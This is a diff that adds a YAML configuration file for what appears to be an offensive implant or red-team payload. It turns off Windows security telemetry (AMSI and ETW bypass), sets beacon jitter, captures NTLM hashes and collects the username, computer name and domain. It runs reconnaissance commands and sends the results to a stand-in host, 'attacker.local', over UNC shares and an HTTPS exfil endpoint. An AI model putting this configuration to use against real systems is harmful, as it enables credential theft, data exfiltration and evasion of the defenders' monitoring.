@@ -1,0 +1,23 @@
+additional_vars:
+- USERNAME
+- COMPUTERNAME
+- USERDOMAIN
+evasion:
+  anti_amsi: true
+  anti_etw: true
+  jitter_max: 5000
+  jitter_min: 1000
+  legitimate_target: true
+exfil_methods:
+- compress: true
+  host: attacker.local
+  type: unc
+- host: attacker.local
+  path: /api/v1/exfil
+  port: 8443
+  ssl: true
+  type: http
+ntlm_capture: true
+target_command:
+- whoami
+- ipconfig /all
